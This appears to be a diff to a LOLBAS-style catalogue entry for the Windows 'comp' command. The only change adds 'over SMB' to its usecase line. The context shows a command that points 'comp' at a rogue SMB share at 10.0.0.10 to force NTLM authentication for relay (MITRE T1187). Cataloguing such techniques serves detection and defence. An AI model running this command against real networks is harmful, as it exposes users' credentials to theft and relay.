@@ -6,7 +6,7 @@ Created: 2024-02-13
 Commands:
   - Command: comp /M \\10.0.0.10\ fake.txt
     Description: Tries to compare a file from rogue SMB Share with a fake.txt file
-    Usecase: Relay a NTLM authentication
+    Usecase: Relay a NTLM authentication over SMB
     Category: Credentials
     Privileges: User
     MitreID: T1187
